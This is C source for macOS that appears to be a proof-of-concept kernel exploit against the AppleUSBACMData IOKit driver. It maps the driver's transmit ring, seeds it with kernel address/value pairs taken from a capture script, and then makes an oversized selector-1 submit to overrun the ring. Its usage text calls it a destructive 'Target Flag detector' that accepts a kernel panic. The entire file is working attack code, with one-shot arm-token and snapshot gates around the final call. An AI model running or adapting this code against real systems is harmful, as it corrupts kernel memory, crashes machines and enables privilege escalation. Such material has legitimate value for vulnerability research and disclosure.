#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <mach/mach.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define RING_SIZE 0x10000ULL
#define SAFE_SUBMIT 0x100ULL
#define FIRE_SUBMIT 0x8000ULL
#define SAFE_CALLS 3
#define POSTFIRE_SETTLE_SECONDS 30

static const char arm_contents[] =
    "APPLEUSBSERIAL_SEL1_ASB_26A428_ONCE\n";

struct asb_snapshot {
    uint64_t kern_value;
    uint64_t kern_address;
    char boot_session[64];
};

static FILE *state_log;

static void record(const char *format, ...)
{
    va_list ap;

    va_start(ap, format);
    vprintf(format, ap);
    va_end(ap);
    fflush(stdout);

    if (state_log != NULL) {
        va_start(ap, format);
        vfprintf(state_log, format, ap);
        va_end(ap);
        fflush(state_log);
        (void)fsync(fileno(state_log));
    }
}

static int make_path(char *destination, size_t destination_size,
    const char *directory, const char *name)
{
    int length = snprintf(destination, destination_size, "%s/%s",
        directory, name);

    return length > 0 && (size_t)length < destination_size;
}

static int sync_path(const char *path)
{
    int descriptor = open(path, O_RDONLY);
    int result;

    if (descriptor < 0)
        return 0;
    result = fsync(descriptor) == 0;
    close(descriptor);
    return result;
}

static int sync_directory(const char *path)
{
    int descriptor = open(path, O_RDONLY);
    int result;

    if (descriptor < 0)
        return 0;
    result = fsync(descriptor) == 0;
    close(descriptor);
    return result;
}

static int sync_parent_directory(const char *path)
{
    char parent[1024];
    char *separator;

    if (snprintf(parent, sizeof(parent), "%s", path) <= 0 ||
        strlen(path) >= sizeof(parent))
        return 0;
    separator = strrchr(parent, '/');
    if (separator == NULL)
        return sync_directory(".");
    if (separator == parent)
        separator[1] = '\0';
    else
        *separator = '\0';
    return sync_directory(parent);
}

static int consume_arm_token(const char *token_path,
    const char *evidence_directory)
{
    char consumed_path[1024];
    char contents[sizeof(arm_contents)];
    struct stat token_stat;
    ssize_t amount;
    int descriptor;

    if (lstat(token_path, &token_stat) != 0 ||
        !S_ISREG(token_stat.st_mode) || token_stat.st_uid != geteuid() ||
        token_stat.st_nlink != 1 || (token_stat.st_mode & 077) != 0 ||
        token_stat.st_size != (off_t)(sizeof(arm_contents) - 1)) {
        record("REFUSING: one-shot arm token is missing or unsafe.\n");
        return 0;
    }
    descriptor = open(token_path, O_RDONLY | O_NOFOLLOW);
    if (descriptor < 0) {
        record("open(%s): %s\n", token_path, strerror(errno));
        return 0;
    }
    amount = read(descriptor, contents, sizeof(contents));
    close(descriptor);
    if (amount != (ssize_t)(sizeof(arm_contents) - 1) ||
        memcmp(contents, arm_contents, sizeof(arm_contents) - 1) != 0) {
        record("REFUSING: one-shot arm token contents do not match.\n");
        return 0;
    }
    if (!make_path(consumed_path, sizeof(consumed_path), evidence_directory,
            "ARM_CONSUMED.once") || rename(token_path, consumed_path) != 0) {
        record("REFUSING: could not atomically consume arm token: %s\n",
            strerror(errno));
        return 0;
    }
    if (!sync_path(consumed_path) || !sync_directory(evidence_directory) ||
        !sync_parent_directory(token_path)) {
        record("REFUSING: could not persist consumed arm token.\n");
        return 0;
    }
    record("one-shot arm token consumed; no retry is possible without "
        "a separate manual re-arm\n");
    return 1;
}

static int run_prefire_capture(const char *script, const char *output,
    const char *asb_reader)
{
    pid_t child = fork();
    int status;

    if (child < 0) {
        record("fork(prefire): %s\n", strerror(errno));
        return 0;
    }
    if (child == 0) {
        execl(script, script, output, asb_reader, (char *)NULL);
        fprintf(stderr, "exec %s: %s\n", script, strerror(errno));
        _exit(127);
    }
    if (waitpid(child, &status, 0) != child) {
        record("waitpid(prefire): %s\n", strerror(errno));
        return 0;
    }
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        record("prefire capture rejected the venue (status=%#x)\n", status);
        return 0;
    }
    if (!sync_path(output)) {
        record("fsync(%s): %s\n", output, strerror(errno));
        return 0;
    }
    return 1;
}

static int parse_prefire(const char *path, struct asb_snapshot *snapshot)
{
    FILE *input = fopen(path, "r");
    char line[512];
    int have_value = 0;
    int have_address = 0;
    int have_boot = 0;

    if (input == NULL) {
        record("fopen(%s): %s\n", path, strerror(errno));
        return 0;
    }
    memset(snapshot, 0, sizeof(*snapshot));
    while (fgets(line, sizeof(line), input) != NULL) {
        if (sscanf(line, "KERN_VALUE=%" SCNx64,
                &snapshot->kern_value) == 1) {
            have_value = 1;
        } else if (sscanf(line, "KERN_ADDRESS=%" SCNx64,
                &snapshot->kern_address) == 1) {
            have_address = 1;
        } else if (sscanf(line, "kern.bootsessionuuid: %63s",
                snapshot->boot_session) == 1) {
            have_boot = 1;
        }
    }
    fclose(input);

    if (!have_value || !have_address || !have_boot ||
        snapshot->kern_value == 0 || snapshot->kern_address == 0 ||
        snapshot->kern_value == snapshot->kern_address) {
        record("REFUSING: incomplete or invalid ASB snapshot in %s\n", path);
        return 0;
    }
    return 1;
}

static int same_snapshot(const struct asb_snapshot *first,
    const struct asb_snapshot *second)
{
    return first->kern_value == second->kern_value &&
        first->kern_address == second->kern_address &&
        strcmp(first->boot_session, second->boot_session) == 0;
}

static void fill_asb_pair(mach_vm_address_t address, size_t size,
    const struct asb_snapshot *snapshot)
{
    volatile uint64_t *words = (volatile uint64_t *)(uintptr_t)address;
    size_t count = size / sizeof(*words);

    for (size_t index = 0; index < count; index++)
        words[index] = (index & 1) ? snapshot->kern_value
                                   : snapshot->kern_address;
    __sync_synchronize();
}

static io_service_t find_service(void)
{
    io_iterator_t iterator = IO_OBJECT_NULL;
    io_service_t service = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
        IOServiceMatching("AppleUSBACMData"), &iterator);

    if (kr == KERN_SUCCESS) {
        service = IOIteratorNext(iterator);
        IOObjectRelease(iterator);
    }
    return service;
}

static kern_return_t submit(io_connect_t connection, uint64_t length,
    const char *phase)
{
    const uint64_t input[] = {0, length};
    uint32_t output_count = 0;
    kern_return_t kr;

    record("%s: selector1 ack=0 submit=%#llx\n", phase, length);
    kr = IOConnectCallScalarMethod(connection, 1,
        input, 2, NULL, &output_count);
    record("%s: selector1 returned %#x\n", phase, kr);
    return kr;
}

int main(int argc, char **argv)
{
    static const char fire_arg[] =
        "--fire-live-same-boot-asb-I-accept-kernel-panic";
    char state_path[1024];
    char initial_path[1024];
    char immediate_path[1024];
    struct stat output_stat;
    struct asb_snapshot initial;
    struct asb_snapshot immediate;
    io_service_t service = IO_OBJECT_NULL;
    io_connect_t connection = IO_OBJECT_NULL;
    mach_vm_address_t transmit_address = 0;
    mach_vm_size_t transmit_size = 0;
    kern_return_t kr;
    int exit_status = 1;

    if (argc != 6 || strcmp(argv[1], fire_arg) != 0) {
        fprintf(stderr,
            "Usage: %s %s EVIDENCE_DIR PREFIRE_CAPTURE ASB_READER ARM_TOKEN\n"
            "This is a destructive, stock-only Target Flag detector.\n",
            argv[0], fire_arg);
        return 2;
    }
    if (geteuid() == 0) {
        fprintf(stderr, "REFUSING: run as an ordinary non-root user.\n");
        return 3;
    }
    if (stat(argv[2], &output_stat) != 0 || !S_ISDIR(output_stat.st_mode)) {
        fprintf(stderr, "REFUSING: evidence directory is missing.\n");
        return 3;
    }
    if (access(argv[3], X_OK) != 0 || access(argv[4], X_OK) != 0) {
        fprintf(stderr, "REFUSING: prefire script or ASB reader is not executable.\n");
        return 3;
    }
    if (!make_path(state_path, sizeof(state_path), argv[2], "run_state.log") ||
        !make_path(initial_path, sizeof(initial_path), argv[2], "prefire.txt") ||
        !make_path(immediate_path, sizeof(immediate_path), argv[2],
            "prefire_immediate.txt")) {
        fprintf(stderr, "REFUSING: evidence path is too long.\n");
        return 3;
    }

    state_log = fopen(state_path, "w");
    if (state_log == NULL) {
        fprintf(stderr, "fopen(%s): %s\n", state_path, strerror(errno));
        return 3;
    }
    (void)fchmod(fileno(state_log), 0600);
    record("uid=%u stock ASB shot starting\n", (unsigned)geteuid());

    /* This gate also refuses disabled SIP or any non-empty boot arguments. */
    if (!run_prefire_capture(argv[3], initial_path, argv[4]) ||
        !parse_prefire(initial_path, &initial)) {
        exit_status = 4;
        goto cleanup;
    }
    record("initial boot=%s KERN_ADDRESS=%#llx KERN_VALUE=%#llx\n",
        initial.boot_session, initial.kern_address, initial.kern_value);

    service = find_service();
    if (service == IO_OBJECT_NULL) {
        record("No AppleUSBACMData service found.\n");
        exit_status = 5;
        goto cleanup;
    }
    kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
    IOObjectRelease(service);
    service = IO_OBJECT_NULL;
    record("IOServiceOpen(type=0): %#x connection=%#x\n", kr, connection);
    if (kr != KERN_SUCCESS) {
        exit_status = 6;
        goto cleanup;
    }

    const uint64_t setup[] = {20, 16};
    uint32_t output_count = 0;
    kr = IOConnectCallScalarMethod(connection, 0,
        setup, 2, NULL, &output_count);
    record("selector0 setup: %#x\n", kr);
    if (kr != KERN_SUCCESS) {
        exit_status = 7;
        goto cleanup;
    }

    kr = IOConnectMapMemory64(connection, 2, mach_task_self(),
        &transmit_address, &transmit_size, kIOMapAnywhere);
    record("map transmit ring: %#x address=%#llx size=%#llx\n",
        kr, transmit_address, transmit_size);
    if (kr != KERN_SUCCESS || transmit_size < RING_SIZE) {
        exit_status = 8;
        goto cleanup;
    }
    fill_asb_pair(transmit_address, RING_SIZE, &initial);

    for (int index = 0; index < SAFE_CALLS; index++) {
        char phase[32];

        snprintf(phase, sizeof(phase), "advance[%d/%d]", index + 1,
            SAFE_CALLS);
        if (submit(connection, SAFE_SUBMIT, phase) != KERN_SUCCESS) {
            record("REFUSING: an in-bounds pool-advance call failed.\n");
            exit_status = 9;
            goto cleanup;
        }
        usleep(500000);
    }

    if (!run_prefire_capture(argv[3], immediate_path, argv[4]) ||
        !parse_prefire(immediate_path, &immediate)) {
        exit_status = 10;
        goto cleanup;
    }
    if (!same_snapshot(&initial, &immediate)) {
        record("REFUSING: prefire snapshots differ; no oversized call made.\n");
        exit_status = 11;
        goto cleanup;
    }
    fill_asb_pair(transmit_address, RING_SIZE, &immediate);
    record("prefire match; source+0=%#llx/%#llx source+0x300=%#llx/%#llx\n",
        *(volatile uint64_t *)(uintptr_t)(transmit_address + 0x0),
        *(volatile uint64_t *)(uintptr_t)(transmit_address + 0x8),
        *(volatile uint64_t *)(uintptr_t)(transmit_address + 0x300),
        *(volatile uint64_t *)(uintptr_t)(transmit_address + 0x308));
    if (!consume_arm_token(argv[5], argv[2])) {
        record("REFUSING: one-shot arm was not consumed; no oversized call made.\n");
        exit_status = 12;
        goto cleanup;
    }
    record("FIRE: ASB pair spans the full ring; oversized source starts at +0x300\n");

    kr = submit(connection, FIRE_SUBMIT, "FIRE");
    record("selector returned; retaining resources for %d seconds so the normal "
        "consumer can run (return=%#x)\n", POSTFIRE_SETTLE_SECONDS, kr);
    sleep(POSTFIRE_SETTLE_SECONDS);
    record("no panic observed by userspace during the settle interval\n");
    exit_status = 0;

cleanup:
    if (transmit_address != 0 && connection != IO_OBJECT_NULL)
        IOConnectUnmapMemory64(connection, 2, mach_task_self(),
            transmit_address);
    if (connection != IO_OBJECT_NULL)
        IOServiceClose(connection);
    if (service != IO_OBJECT_NULL)
        IOObjectRelease(service);
    record("exit_status=%d\n", exit_status);
    fclose(state_log);
    state_log = NULL;
    return exit_status;
}
